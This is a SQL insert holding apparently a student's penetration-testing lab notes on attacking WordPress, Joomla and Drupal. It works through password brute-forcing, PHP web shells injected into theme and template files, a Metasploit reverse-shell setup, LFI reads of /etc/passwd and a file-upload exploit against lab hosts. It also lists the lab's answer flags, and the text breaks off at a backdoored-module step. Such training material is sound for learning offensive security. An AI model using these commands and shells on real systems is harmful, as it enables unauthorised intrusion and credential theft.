-- Documents Part 3
INSERT INTO "Document" ("id", "title", "slug", "description", "contentMarkdown", "contentHtml", "status", "visibility", "readingTimeMin", "categoryId", "authorId", "createdAt", "updatedAt", "publishedAt", "deletedAt")
VALUES ('cmve9gwsi00vtidi4jh7u8u01', 'Attacking Common Applications ', 'attacking-common-applications', '---', '# Attacking Common Applications 

---

## Table of Contents

1. [WordPress – Discovery & Enumeration](#wordpress--discovery--enumeration)
2. [Attacking WordPress](#attacking-wordpress)
3. [Joomla – Discovery & Enumeration](#joomla---discovery--enumeration)
4. [Attacking Joomla](#attacking-joomla)
5. [Drupal – Discovery & Enumeration](#drupal---discovery--enumeration)
6. [Attacking Drupal](#attacking-drupal)
7. [Tomcat – Discovery & Enumeration](#tomcat---discovery--enumeration)
8. [Attacking Tomcat](#attacking-tomcat)
9. [Jenkins – Discovery & Enumeration](#jenkins---discovery--enumeration)
10. [Attacking Jenkins](#attacking-jenkins)
11. [Splunk – Discovery & Enumeration](#splunk---discovery--enumeration)
12. [Attacking Splunk](#attacking-splunk)
13. [PRTG Network Monitor](#prtg-network-monitor)
14. [osTicket](#osticket)
15. [GitLab – Discovery & Enumeration](#gitlab---discovery--enumeration)
16. [Attacking GitLab](#attacking-gitlab)
17. [Attacking Tomcat CGI](#attacking-tomcat-cgi)
18. [Attacking Common Gateway Interface (CGI) Applications – Shellshock](#attacking-common-gateway-interface-cgi-applications---shellshock)
19. [Attacking Thick Client Applications](#attacking-thick-client-applications)
20. [ColdFusion – Discovery & Enumeration](#coldfusion---discovery--enumeration)
21. [Attacking ColdFusion](#attacking-coldfusion)
22. [IIS Tilde Enumeration](#iis-tilde-enumeration)
23. [LDAP](#ldap)
24. [Web Mass Assignment Vulnerabilities](#web-mass-assignment-vulnerabilities)
25. [Attacking Applications Connecting to Services](#attacking-applications-connecting-to-services)
26. [Other Notable Applications](#other-notable-applications)

---

# WordPress – Discovery & Enumeration

WordPress is an open-source Content Management System (CMS) launched in 2003, written in PHP and typically running on Apache with MySQL as the backend database. It is extremely popular, powering around 32.5% of all websites on the internet, making it the most targeted CMS by attackers and the most commonly encountered platform during external penetration tests. WordPress offers over 50,000 plugins and 4,100+ GPL-licensed themes, which greatly expand its functionality but also introduce serious security risks through third-party code. According to WPScan statistics, 54% of known WordPress vulnerabilities come from plugins, 31.5% from WordPress core, and 14.5% from themes — meaning plugins are the biggest attack surface. A study showed that roughly 8% of WordPress hacks happen due to weak passwords, while 60% were due to an outdated WordPress version being left unpatched. Major companies including The New York Times, Disney, Forbes, Sony, eBay, and Facebook have all used WordPress, confirming that it is used at enterprise scale and must be taken seriously during security assessments.

---

## Discovery / Footprinting

The first step in identifying a WordPress site is browsing to the /robots.txt file, which often reveals WordPress-specific paths and directory names that confirm the CMS in use. A typical WordPress robots.txt contains entries like Disallow: /wp-admin/, Allow: /wp-admin/admin-ajax.php, and Disallow: /wp-content/uploads/wpforms/ — the presence of /wp-admin and /wp-content is a dead giveaway. Browsing to the /wp-admin/ directory will automatically redirect you to /wp-login.php, which is the back-end login portal of the WordPress installation. WordPress stores all installed plugins inside wp-content/plugins/ and all themes inside wp-content/themes/ — both directories are critical enumeration targets. There are five default user roles in WordPress: Administrator (full access including source code editing), Editor (manages all posts), Author (manages own posts), Contributor (writes but cannot publish), and Subscriber (basic browsing only). Gaining Administrator access is usually sufficient to achieve full Remote Code Execution (RCE) on the server, as the Theme Editor allows direct PHP code modification.

---

## Enumeration

### Step 1 — Identify WordPress Version Using cURL

```bash
curl -s http://blog.inlanefreight.local | grep WordPress
```

What this does: curl -s fetches the page silently with no progress output. The output is piped into grep WordPress which searches for any line containing the word "WordPress". The result looks like:

```html
<meta name="generator" content="WordPress 5.8" />
```

This `<meta name="generator">` tag is added by WordPress by default in the HTML source and directly reveals the version number — in this case WordPress 5.8. Note this version down as it will be used to search for known CVEs.

### Step 2 — Identify the Active Theme

```bash
curl -s http://blog.inlanefreight.local/ | grep themes
```

What this does: This fetches the homepage HTML and searches for any reference to the themes folder inside wp-content. The output reveals:

```
href=''http://blog.inlanefreight.local/wp-content/themes/business-gravity/assets/vendors/bootstrap/css/bootstrap.min.css''
```

This tells us the Business Gravity theme is active (later WPScan will refine this to Transport Gravity, a child theme). Knowing the theme name and version allows us to search for known vulnerabilities affecting that specific theme.

### Step 3 — Identify Installed Plugins from Homepage

```bash
curl -s http://blog.inlanefreight.local/ | grep plugins
```

What this does: This searches all HTML on the homepage for references to the wp-content/plugins/ directory. WordPress loads plugin CSS and JavaScript files by referencing their paths in the HTML, which exposes both the plugin name and version. The output reveals:

```
.../plugins/contact-form-7/includes/css/styles.css?ver=5.4.2
.../plugins/mail-masta/lib/subscriber.js?ver=5.8
.../plugins/mail-masta/lib/jquery.validationEngine.js?ver=5.8
.../plugins/mail-masta/lib/css/mm_frontend.css?ver=5.8
.../plugins/contact-form-7/includes/js/index.js?ver=5.4.2
```

From this output we confirm two plugins: Contact Form 7 (version 5.4.2) and mail-masta. The ver=5.8 shown for mail-masta is actually the WordPress core version, not the plugin version — we must check its readme.txt separately.

### Step 4 — Check Plugin readme.txt for Version Number

```bash
curl -s http://blog.inlanefreight.local/wp-content/plugins/mail-masta/readme.txt
```

Or browse directly in browser to:

```
http://blog.inlanefreight.local/wp-content/plugins/mail-masta/
```

What this does: If directory listing is enabled, you will see all files inside the plugin folder. The readme.txt file contains the plugin''s stable version tag. This confirms mail-masta version 1.0.0, which suffers from a Local File Inclusion (LFI) vulnerability published in August 2021.

### Step 5 — Find Additional Plugins on Post Pages

```bash
curl -s http://blog.inlanefreight.local/?p=1 | grep plugins
```

What this does: Some plugins only load their assets on specific pages, not the homepage. Fetching post ID ?p=1 and grepping for plugins reveals:

```
.../plugins/wpdiscuz/themes/default/style.css?ver=7.0.4
```

And buried inside the page HTML content:

```html
<p><a href="http://wordpress.org/plugins/wp-sitemap-page/">Powered by "WP Sitemap Page"</a></p>
```

This reveals two more plugins — wpDiscuz version 7.0.4 (vulnerable to unauthenticated RCE — CVE-2020-24186) and WP Sitemap Page.

### Step 6 — Find WP Sitemap Page Version

```bash
curl -s http://blog.inlanefreight.local/wp-content/plugins/wp-sitemap-page/readme.txt
```

What this does: Reads the readme.txt of the WP Sitemap Page plugin. At the top of the file you will see:

```
Stable tag: 1.6.4
```

Version = 1.6.4

---

## Enumerating Users

WordPress is vulnerable to username enumeration because it returns different error messages depending on whether a username exists or not. When you attempt login at http://blog.inlanefreight.local/wp-login.php with a valid username but wrong password, the error reads:

```
The password for username admin is incorrect.
```

When you use an invalid username, the error reads:

```
The username someone is not registered on this site.
```

This behavioral difference allows an attacker to systematically confirm which usernames are registered. By testing different usernames manually or using WPScan, we confirm valid users. At this stage our confirmed data points are: WordPress 5.8, Transport Gravity theme, plugins (Contact Form 7, mail-masta v1.0.0, wpDiscuz v7.0.4, WP Sitemap Page v1.6.4), and confirmed user: admin. User enumeration is a critical step before any brute-force attack.

---

## WPScan

WPScan is a dedicated automated WordPress security scanner that performs both passive and aggressive enumeration of WordPress installations. It is pre-installed on Parrot OS; if not available, install it with:

```bash
sudo gem install wpscan
```

What this does: Uses Ruby''s gem package manager to download and install the latest version of WPScan globally on the system.

### Step 1 — View Help Menu

```bash
wpscan -h
```

What this does: Displays all available flags and options including --url, --enumerate, --detection-mode, --api-token, -t, and -o.

### Step 2 — Run Full Enumeration Scan

```bash
sudo wpscan --url http://blog.inlanefreight.local --enumerate --api-token YOUR_TOKEN
```

What each flag does:

```
--url          — sets the target WordPress URL
--enumerate    — enables full enumeration (plugins, themes, users, media, backups)
--api-token    — passes your WPVulnDB API key to pull live vulnerability data
```

### WPScan Results — Full Summary

**Users Found:**

```
admin
doug
```

Found via RSS Generator (passive) and Author ID Brute Forcing (aggressive). Both confirmed via Login Error Messages, meaning the login page returned different errors for these usernames proving they exist.

**WordPress Version:**

```
WordPress 5.8 — INSECURE (50 vulnerabilities identified)
```

Found via RSS Generator at /?feed=rss2.

**Theme Found:**

```
Transport Gravity — Version 1.0.1
Location: /wp-content/themes/transport-gravity/
Directory listing is ENABLED on this theme folder
```

**Plugins Found by WPScan:**

```
contact-form-7  —  Version 5.4.2  (outdated, latest is 6.1.7)
mail-masta      —  Version 1.0
```

WPScan did NOT find wpDiscuz or WP Sitemap Page — those required manual enumeration using curl | grep plugins on post pages. This is exactly why manual and automated enumeration must always be combined.

**Vulnerabilities Per Plugin:**

contact-form-7 v5.4.2 has 4 vulnerabilities:

```
Authenticated (Editor+) Arbitrary File Upload — fixed in 5.8.4
Reflected Cross-Site Scripting              — fixed in 5.9.2
Unauthenticated Open Redirect               — fixed in 5.9.5
Order Replay Vulnerability                  — fixed in 6.0.6
```

mail-masta v1.0 has 2 vulnerabilities:

```
Unauthenticated Local File Inclusion (LFI)  — CVE-2016-10956
Multiple SQL Injection                       — CVE-2017-6095 through CVE-2017-6578
```

**Other Important Findings:**

```
XML-RPC enabled          →  http://blog.inlanefreight.local/xmlrpc.php
Upload directory listing →  http://blog.inlanefreight.local/wp-content/uploads/
WordPress readme exposed →  http://blog.inlanefreight.local/readme.html
WP-Cron enabled          →  http://blog.inlanefreight.local/wp-cron.php
```

---

# Attacking WordPress

## Login Bruteforce

With confirmed usernames (admin and doug) from WPScan, the next step is brute-forcing passwords. WPScan supports two attack methods: wp-login (attacks login page directly) and xmlrpc (faster, uses the XML-RPC API). The xmlrpc method is preferred because it tests multiple credentials in a single HTTP request.

Run the brute-force attack against doug:

```bash
sudo wpscan --password-attack xmlrpc -t 20 -U doug -P /usr/share/wordlists/rockyou.txt --url http://blog.inlanefreight.local
```

What each flag does:

```
--password-attack xmlrpc                        — uses the XML-RPC API method for faster brute-forcing
-t 20                                           — uses 20 threads simultaneously to speed up the attack
-U doug                                         — specifies the username to attack
-P /usr/share/wordlists/rockyou.txt             — the password wordlist to iterate through
--url                                           — the target WordPress URL
```

Result:

```
[SUCCESS] - doug / jessica1
[!] Valid Combinations Found:
 | Username: doug, Password: jessica1
```

Confirmed credentials: doug:jessica1

---

## Code Execution

### Step 1 — Log in to WordPress Admin Panel

Using credentials doug:jessica1, log in at:

```
http://blog.inlanefreight.local/wp-login.php
```

After successful login you are redirected to the WordPress admin dashboard at /wp-admin/.

### Step 2 — Navigate to Theme Editor

In the left sidebar click Appearance → Theme Editor. This allows direct editing of PHP source code of any installed theme. Never edit the active theme (Transport Gravity) as it could break the live site. Instead select the inactive theme Twenty Nineteen.

### Step 3 — Inject Web Shell into 404.php

In the Theme Editor select the 404.php file from Twenty Nineteen. Add this single line just below the existing comments:

```php
<?php system($_GET[0]); ?>
```

What this does: The system() function executes a shell command. $_GET[0] takes the value of URL parameter 0 and passes it to the shell. This creates a web shell where any OS command can be run via the URL. Click Update File to save.

### Step 4 — Execute Commands via Web Shell

```bash
curl http://blog.inlanefreight.local/wp-content/themes/twentynineteen/404.php?0=id
```

Output:

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

RCE confirmed as www-data. Replace id with any command to execute it on the server.

### Step 5 — Find System Users with /bin/bash

```bash
curl -s "http://blog.inlanefreight.local/wp-content/themes/twentynineteen/404.php?0=cat+/etc/passwd" | grep /bin/bash
```

Output shows:

```
root:x:0:0:root:/root:/bin/bash
ubuntu:x:1000:1000:ubuntu:/home/ubuntu:/bin/bash
webadmin:x:1001:1001::/home/webadmin:/bin/bash
```

Answer = webadmin is the additional system user with an interactive bash shell.

### Step 6 — Find and Read the Flag

Always confirm the actual webroot first — never assume it is /var/www/html/:

```bash
# Check current directory
curl -s "http://blog.inlanefreight.local/wp-content/themes/twentynineteen/404.php?0=pwd"

# List webroot contents
curl -s "http://blog.inlanefreight.local/wp-content/themes/twentynineteen/404.php?0=ls+/var/www/"

# Find flag file
curl -s "http://blog.inlanefreight.local/wp-content/themes/twentynineteen/404.php?0=find+/var/www+-name+flag*"
```

The actual webroot on this machine was NOT /var/www/html/ — it was:

```
/var/www/blog.inlanefreight.local/
```

This is because the server uses a virtual host setup, meaning each domain gets its own folder under /var/www/. The flag file also had a unique hash in its name:

```
flag_d8e8fca2dc0f896fd7cb4cb0031ba249.txt
```

Read the flag:

```bash
curl -s "http://blog.inlanefreight.local/wp-content/themes/twentynineteen/404.php?0=cat+/var/www/blog.inlanefreight.local/flag_d8e8fca2dc0f896fd7cb4cb0031ba249.txt"
```

Flag = `l00k_ma_unAuth_rc3!`

---

## Metasploit — wp_admin_shell_upload (Alternative RCE Method)

As an alternative to manual code injection, Metasploit''s wp_admin_shell_upload module automates the entire process by uploading a malicious plugin and returning a PHP Meterpreter shell.

```bash
msf6 > use exploit/unix/webapp/wp_admin_shell_upload
```

Set all required options:

```bash
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set username doug
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set password jessica1
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set lhost 10.10.14.217
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set rhost 10.129.128.213
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set VHOST blog.inlanefreight.local
```

Verify options:

```bash
msf6 exploit(unix/webapp/wp_admin_shell_upload) > show options
```

What each option does:

```
username / password  — WordPress admin credentials to authenticate with
lhost                — your attacker machine IP where the reverse shell connects back to
rhost                — the target server IP address
VHOST                — virtual hostname of the WordPress site (required when IP and hostname differ)
LPORT                — defaults to 4444, the port receiving the reverse shell
```

Launch the exploit:

```bash
msf6 exploit(unix/webapp/wp_admin_shell_upload) > exploit
```

What happens step by step:

```
1. Metasploit authenticates to WordPress using doug:jessica1
2. Uploads a malicious PHP plugin file to /wp-content/plugins/
3. Executes the plugin to trigger a PHP Meterpreter reverse shell
4. Opens a Meterpreter session back to your LHOST:4444
5. Automatically cleans up the uploaded plugin files
```

Confirm access:

```bash
meterpreter > getuid
Server username: www-data (33)
```

All artifacts created during the Metasploit exploit must be cleaned up and documented in the pentest report appendices including exploited systems, compromised users, artifacts created, and any changes made.

---

## Leveraging Known Vulnerabilities

### Vulnerable Plugins – mail-masta (LFI)

The mail-masta plugin version 1.0.0 contains a critical unauthenticated LFI vulnerability in count_of_send.php. The vulnerable code:

```php
<?php
include($_GET[''pl'']);
```

The pl GET parameter is passed directly into include() with zero validation. Exploit it to read /etc/passwd:

```bash
curl -s http://blog.inlanefreight.local/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd
```

What this does: Sends a GET request with pl=/etc/passwd. The include() function reads and outputs the system password file returning all user entries. From the output, lines ending in /bin/bash identify interactive login users: root, ubuntu, and webadmin. This requires zero authentication.

### Vulnerable Plugins – wpDiscuz (Unauthenticated RCE)

wpDiscuz version 7.0.4 contains CVE-2020-24186 — an unauthenticated file upload bypass that allows uploading PHP web shells by tricking MIME type detection.

```bash
python3 wp_discuz.py -u http://blog.inlanefreight.local -p /?p=1
```

What each parameter does:

```
-u  — the target WordPress URL
-p /?p=1  — a valid post path (comment upload form only exists on posts)
```

What the script does step by step:

```
1. Fetches the post page to retrieve the wmuSecurity nonce (anti-CSRF token)
2. Generates a random PHP filename (e.g., uthsdkbywoxeebg)
3. Uploads the PHP shell disguised as an image to /wp-content/uploads/
4. Returns the full URL of the uploaded shell
```

The script''s built-in execution may fail, so trigger it manually:

```bash
curl -s http://blog.inlanefreight.local/wp-content/uploads/2021/08/uthsdkbywoxeebg-1629904090.8191.php?cmd=id
```

Output:

```
GIF689a;
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

The GIF689a; prefix is the MIME bypass trick — the file starts with a GIF magic byte signature to fool the upload validator. RCE confirmed. The shell file must be deleted after testing and listed as a testing artifact in the report.

---

## Complete Final Answers Summary

| Question | Command / Method | Answer |
|----------|-----------------|--------|
| Q1 — Find flag.txt in uploads | WPScan finds open dir → browse /wp-content/uploads/2021/08/ | 0ptions_ind3xeS_ftw! |
| Q2 — Hidden plugin name | curl /?p=1 \| grep plugins | WP Sitemap Page |
| Q3 — Plugin version | curl .../wp-sitemap-page/readme.txt | 1.6.4 |
| Q4 — Other user besides admin | WPScan user enumeration | doug |
| Q5 — doug''s password | WPScan brute force xmlrpc with rockyou.txt | jessica1 |
| Q6 — System user with /bin/bash | LFI or RCE → cat /etc/passwd \| grep /bin/bash | webadmin |
| Q7 — Webroot flag contents | RCE → find /var/www -name flag* → cat the file | l00k_ma_unAuth_rc3! |

---

# Joomla - Discovery & Enumeration

Joomla is a free and open-source Content Management System (CMS) released in August 2005, written in PHP and using MySQL as the backend database. It is used for a wide variety of purposes including discussion forums, photo galleries, e-Commerce, and user-based communities. Like WordPress, Joomla can be enhanced with over 7,000 extensions and over 1,000 templates, making it highly customizable for different needs. There are up to 2.5 million sites on the internet currently running Joomla, which accounts for 3.5% of the CMS market share. The name Joomla means "all together" in Swahili (phonetic spelling of "Jumla"), reflecting its community-driven nature with close to 700,000 users in its online forums. Some notable organizations using Joomla include eBay, Yamaha, Harvard University, and the UK government, and over 770 different developers have contributed to it over the years.

---

## Discovery/Footprinting

When encountering an unknown web application during an external penetration test, fingerprinting the CMS in use is an important first step before attempting any attack. The first way to confirm a Joomla site is by looking at the page source and grepping for the word "Joomla" which will reveal a generator meta tag. The robots.txt file on a Joomla installation contains many disallowed directories like /administrator/, /bin/, /cache/, /cli/, /components/, /includes/, /installation/, /language/, /layouts/, /libraries/, /logs/, /modules/, /plugins/, and /tmp/ — all of which confirm Joomla is in use. The Joomla favicon is also a telltale sign but is not always present. The README.txt file, if present, often reveals the Joomla version number directly and is one of the quickest ways to fingerprint the installation. The administrator/manifests/files/joomla.xml file provides detailed version information in XML format and the plugins/system/cache/cache.xml file can give the approximate version as well.

### Step 1 — Grep Page Source for Joomla

```bash
curl -s http://dev.inlanefreight.local/ | grep Joomla
```

What this does: curl -s fetches the page silently without showing progress. The output is piped to grep Joomla which searches for any line containing the word "Joomla". The output reveals:

```html
<meta name="generator" content="Joomla! - Open Source Content Management" />
```

This generator meta tag confirms we are dealing with a Joomla installation.

### Step 2 — Read README.txt for Version

```bash
curl -s http://dev.inlanefreight.local/README.txt | head -n 5
```

What this does: Fetches the README.txt file from the Joomla installation root. The head -n 5 command shows only the first 5 lines which is enough to see the version. Output:

```
1- What is this?
    * This is a Joomla! installation/upgrade package to version 3.x
    * Joomla! Official site: https://www.joomla.org
    * Joomla! 3.9 version history - https://docs.joomla.org/Special:MyLanguage/Joomla_3.9_version_history
```

This confirms the Joomla 3.x version branch is in use.

### Step 3 — Read joomla.xml for Exact Version

```bash
curl -s http://dev.inlanefreight.local/administrator/manifests/files/joomla.xml | xmllint --format -
```

What this does: Fetches the joomla.xml manifest file which contains exact version information. The xmllint --format - command formats the XML output to be human-readable. The output reveals:

```xml
<version>3.9.4</version>
<creationDate>March 2019</creationDate>
```

This gives us the exact version 3.9.4 which we can now use to search for known CVEs.

### Step 4 — Query the Joomla API for Statistics

```bash
curl -s https://developer.joomla.org/stats/cms_version | python3 -m json.tool
```

What this does: Sends a request to the official Joomla developer API which returns anonymous usage statistics. The python3 -m json.tool formats the JSON output to be readable. The output shows version distribution across over 2.7 million Joomla installs, confirming how widespread Joomla is. This is useful for understanding the target landscape during reconnaissance.

---

## Enumeration

### Step 1 — Install and Run droopescan

droopescan is a plugin-based scanner that works for SilverStripe, WordPress, and Drupal with limited functionality for Joomla and Moodle. It can be installed via pip:

```bash
sudo pip3 install droopescan
```

What this does: Uses Python''s pip package manager to download and install droopescan and all its dependencies globally on the system.

Verify it is working:

```bash
droopescan -h
```

What this does: Displays the droopescan help menu showing available subcommands like scan and stats, and example usage patterns like droopescan scan drupal -u URL_HERE. Now run a scan against the Joomla target:

```bash
droopescan scan joomla --url http://dev.inlanefreight.local/
```

What each part does:

```
scan joomla                         — tells droopescan to scan a Joomla installation specifically
--url http://dev.inlanefreight.local/  — sets the target URL to scan
```

Output reveals:

```
[+] Possible version(s):
    3.8.10
    3.8.11
    3.8.12
    3.8.13

[+] Possible interesting urls found:
    Detailed version information. - http://dev.inlanefreight.local/administrator/manifests/files/joomla.xml
    Login page. - http://dev.inlanefreight.local/administrator/
    License file. - http://dev.inlanefreight.local/LICENSE.txt
    Version attribute contains approx version - http://dev.inlanefreight.local/plugins/system/cache/cache.xml
```

droopescan provides a version range and interesting URLs but does not give deep plugin information for Joomla.

### Step 2 — Install and Run JoomlaScan

JoomlaScan is a Python tool inspired by the OWASP joomscan tool. It requires Python 2.7 and the bs4 dependency. Reference: https://github.com/drego85/JoomlaScan

Install the dependency first:

```bash
python2 -m pip install bs4
```

What this does: Uses Python 2''s pip to install the BeautifulSoup4 library which JoomlaScan depends on for HTML parsing. Now run the scan:

```bash
python2 joomlascan.py -u http://dev.inlanefreight.local
```

What this does: Runs JoomlaScan against the target URL using 10 concurrent threads. It checks for installed Joomla components by sending requests to known component paths like index.php?option=com_actionlogs. The output finds accessible directories, LICENSE files, and components including com_actionlogs, com_admin, com_ajax, and com_banners. This helps identify explorable directories and the installed component list.

### Step 3 — Brute Force the Admin Login

The administrator login portal is located at http://dev.inlanefreight.local/administrator/index.php. Joomla returns a generic error message for failed logins making user enumeration difficult:

```
Warning: Username and password do not match or you do not have an account yet.
```

The default administrator account is admin but the password is set at install time. Use the brute-force script with a password wordlist. Reference: https://github.com/ajnik/joomla-bruteforce

```bash
sudo python3 joomla-brute.py -u http://dev.inlanefreight.local -w /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt -usr admin
```

What each flag does:

```
-u http://dev.inlanefreight.local  — the target Joomla URL
-w /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt  — the password wordlist to iterate through
-usr admin  — the username to brute-force against
```

Result:

```
admin:admin
```

Credentials admin:admin confirmed. This is a clear case of weak default credentials not being changed after installation.

---

# Attacking Joomla

With confirmed admin credentials admin:admin, we can now log into the Joomla back-end and abuse built-in functionality to gain Remote Code Execution. Like WordPress and Drupal, Joomla has suffered from various vulnerabilities in core and extensions, and gaining admin access to the back-end is typically sufficient to achieve full code execution on the server. The primary method we will use is modifying a template file through the Joomla template editor to inject a PHP web shell, similar to the WordPress Theme Editor approach. Joomla also has a history of CVEs — at the time of writing there have been 426 Joomla-related vulnerabilities receiving CVEs, with the vast majority relating to extensions rather than Joomla core. We will also look at CVE-2019-10945, a directory traversal and authenticated file deletion vulnerability affecting version 3.9.4 specifically.

## Abusing Built-In Functionality

### Step 1 — Log in to the Joomla Administrator Panel

Browse to:

```
http://dev.inlanefreight.local/administrator
```

Log in using the credentials admin:admin. If you receive an error stating "An error has occurred. Call to a member function format() on null" after logging in, navigate to:

```
http://dev.inlanefreight.local/administrator/index.php?option=com_plugins
```

Disable the "Quick Icon - PHP Version Check" plugin. This will allow the control panel to display properly.

### Step 2 — Navigate to Templates

From the admin panel, click on Templates on the bottom left under the Configuration section. This brings up the templates menu showing all installed templates including Beez3 and Protostar.

### Step 3 — Select Protostar Template

Click on the template name protostar under the Template column header. This brings us to the Templates: Customise page where we can edit the PHP source files of this template directly.

### Step 4 — Edit error.php and Inject Web Shell

Click on the error.php page to pull up its source code. Add the following PHP one-liner just below the existing code. Using a hashed parameter name instead of the common cmd makes the shell less easily discoverable by drive-by attackers:

```php
system($_GET[''dcfdd5e021a869fcc6dfaef8bf31377e'']);
```

What this does: The system() function executes a shell command. $_GET[''dcfdd5e021a869fcc6dfaef8bf31377e''] takes the value of the URL parameter with that hashed name and passes it directly to the shell. Click Save & Close at the top to save the change.

### Step 5 — Execute Commands via Web Shell

```bash
curl -s http://dev.inlanefreight.local/templates/protostar/error.php?dcfdd5e021a869fcc6dfaef8bf31377e=id
```

What this does: Sends a GET request to the modified error.php file with the hashed parameter set to id. The system() function executes the id command on the server and returns the output. Result:

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

RCE confirmed as www-data. From here we can run any command or upgrade to a full interactive reverse shell. After testing, remove the PHP snippet from error.php and document the file name and location in the pentest report appendices.

---

## Leveraging Known Vulnerabilities

### CVE-2019-10945 — Directory Traversal (Joomla 3.9.4)

This version of Joomla is vulnerable to CVE-2019-10945, a directory traversal and authenticated file deletion vulnerability. We can use the exploit script to list contents of the webroot and other directories. This is useful when the admin login portal is accessible and we have admin credentials.

```bash
python2.7 joomla_dir_trav.py --url "http://dev.inlanefreight.local/administrator/" --username admin --password admin --dir /
```

What each flag does:

```
--url       — the full URL to the Joomla administrator directory
--username admin  — the admin username
--password admin  — the admin password
--dir /     — the directory to list (starting from root)
```

Output reveals the webroot contents:

```
administrator
bin
cache
cli
components
images
includes
language
layouts
libraries
media
modules
plugins
templates
tmp
LICENSE.txt
README.txt
configuration.php
htaccess.txt
index.php
robots.txt
web.config.txt
```

This confirms the vulnerability is exploitable. The configuration.php file is particularly interesting as it typically contains database credentials. This vulnerability could allow access to sensitive files if accessible via the application URL.

---

# Drupal - Discovery & Enumeration

Drupal, launched in 2001, is the third major CMS covered in this module and is another open-source CMS popular among companies and developers. It is written in PHP and supports MySQL or PostgreSQL for the backend, with SQLite available if no DBMS is installed. Like WordPress, Drupal allows users to enhance websites through themes and modules — at the time of writing the Drupal project has nearly 43,000 modules and 2,900 themes. Around 1.5% of sites on the internet run Drupal (over 1.1 million sites), and it accounts for approximately 2.4% of the CMS market share and is used in 100 languages. Some major brands using Drupal include Tesla and Warner Bros Records, and 56% of government websites across the world use Drupal. During penetration tests, Drupal is encountered less frequently than WordPress but still represents a significant target due to its presence in government, education, and enterprise environments.

---

## Discovery/Footprinting

A Drupal website can be identified in several ways including the header or footer message "Powered by Drupal", the standard Drupal logo, the presence of a CHANGELOG.txt or README.txt file, via the page source, or clues in the robots.txt file such as references to /node. Drupal indexes its content using nodes — a node can hold anything such as a blog post, poll, or article — and page URIs are usually of the form /node/<nodeid> which is a strong Drupal indicator. Drupal supports three types of users by default: Administrator (complete control over the website), Authenticated User (can log in and perform operations based on permissions), and Anonymous (all website visitors who can only read posts by default). The quickest fingerprinting method is to grep the page source for the word "Drupal":

```bash
curl -s http://drupal.inlanefreight.local | grep Drupal
```

What this does: Fetches the Drupal homepage silently and greps for "Drupal". Output:

```html
<meta name="Generator" content="Drupal 8 (https://www.drupal.org)" />
<span>Powered by <a href="https://www.drupal.org">Drupal</a></span>
```

This confirms Drupal 8 is in use.

---

## Enumeration

### Step 1 — Check CHANGELOG.txt for Version

```bash
curl -s http://drupal-acc.inlanefreight.local/CHANGELOG.txt | grep -m2 ""
```

What this does: Fetches the CHANGELOG.txt file which lists all version history. The -m2 flag limits grep to return only the first 2 matching lines which is enough to see the version. Output:

```
Drupal 7.57, 2018-02-21
```

This confirms Drupal 7.57 on this older installation. However, newer Drupal versions block access to this file by default and return a 404:

```bash
curl -s http://drupal.inlanefreight.local/CHANGELOG.txt
```

Output:

```html
<!DOCTYPE html><html><head><title>404 Not Found</title></head><body><h1>Not Found</h1>
```

When CHANGELOG.txt is blocked, use droopescan instead.

### Step 2 — Run droopescan Against Drupal

droopescan has much more functionality for Drupal than for Joomla:

```bash
droopescan scan drupal -u http://drupal.inlanefreight.local
```

What each part does:

```
scan drupal                          — tells droopescan to use its Drupal-specific scanning functionality
-u http://drupal.inlanefreight.local  — sets the target Drupal URL
```

Output:

```
[+] Plugins found:
    php http://drupal.inlanefreight.local/modules/php/
        http://drupal.inlanefreight.local/modules/php/LICENSE.txt

[+] Possible version(s):
    8.9.0
    8.9.1

[+] Possible interesting urls found:
    Default admin - http://drupal.inlanefreight.local/user/login

[+] Scan finished (0:03:19.199526 elapsed)
```

This instance appears to be running Drupal 8.9.1. The PHP module is also found installed, which is important for our attack approach. The default admin login page is at /user/login.

---

# Attacking Drupal

Now that we have confirmed Drupal and fingerprinted the version, we can look for misconfigurations and vulnerabilities to gain internal network access. Unlike some CMS platforms, obtaining a shell on a Drupal host via the admin console is not as easy as editing a PHP file in a theme — Drupal requires specific modules or backdoored module uploads to achieve code execution. We will cover three attack methods: leveraging the PHP Filter Module (for older Drupal versions before 8), uploading a backdoored module, and exploiting the three major Drupalgeddon vulnerabilities (CVE-2014-3704, CVE-2018-7600, and CVE-2018-7602) which have been dubbed Drupalgeddon, Drupalgeddon2, and Drupalgeddon3 respectively. Each of these represents a different level of authentication requirement and impact.

## Leveraging the PHP Filter Module

In older versions of Drupal (before version 8), it was possible to log in as admin and enable the PHP filter module which allows embedded PHP code and snippets to be evaluated directly in content pages.

### Step 1 — Enable PHP Filter Module

Navigate to admin/modules and tick the checkbox next to the PHP Filter module. Scroll down and click Save configuration.

### Step 2 — Create Malicious Content Page

Navigate to Content → Add content → Basic page. Create a page with the following malicious PHP snippet. Using an MD5 hash as the parameter name avoids making the shell easily accessible to drive-by attackers:

```php
<?php
system($_GET[''dcfdd5e021a869fcc6dfaef8bf31377e'']);
?>
```

Set the Text format dropdown to PHP code. Click Save.

### Step 3 — Execute Commands via Web Shell

```bash
curl -s http://drupal-qa.inlanefreight.local/node/3?dcfdd5e021a869fcc6dfaef8bf31377e=id | grep uid | cut -f4 -d">"
```

What this does: Fetches the newly created page (node/3) with the hashed parameter set to id. The output is piped to grep uid which finds the line containing the command output, then cut -f4 -d">" extracts the actual uid value by splitting on > and taking the 4th field. Output:

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

RCE confirmed. From version 8 onwards, the PHP Filter module is not installed by default and must be downloaded manually from the Drupal website and uploaded.

---

## Uploading a Backdoored Module

Drupal allows users with appropriate permissions to upload new modules. A backdoored module is created by adding a shell to an existing legitimate module.

### Step 1 — Download a Legitimate Module

Download the CAPTCHA module:

```bash
wget --no-check-certificate https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz
tar xvf captcha-8.x-1.2.tar.gz
```

What this does: wget --no-check-certificate downloads the CAPTCHA module archive bypassing SSL certificate checks. tar xvf extracts the archive, creating the captcha folder.

### Step 2 — Create the PHP Web Shell

```php
<?php
